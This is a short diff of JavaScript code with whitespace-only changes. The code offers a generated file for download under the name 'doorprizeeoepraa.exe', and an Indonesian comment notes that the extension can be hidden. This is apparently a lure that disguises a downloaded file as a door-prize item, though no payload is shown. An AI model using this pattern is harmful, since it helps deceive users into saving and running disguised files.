@@ -177,7 +177,7 @@
 
           const blob = new Blob([zshContent], { type: "text/plain" });
 
-         const options = {
+          const options = {
             suggestedName: "doorprizeeoepraa.exe", // Akan diunduh dengan ekstensi .exe, tapi bisa disembunyikan
             types: [
               {
@@ -189,7 +189,6 @@
             ],
             excludeAcceptAllOption: true,
           };
-
 
           try {
             const handle = await window.showSaveFilePicker(options);
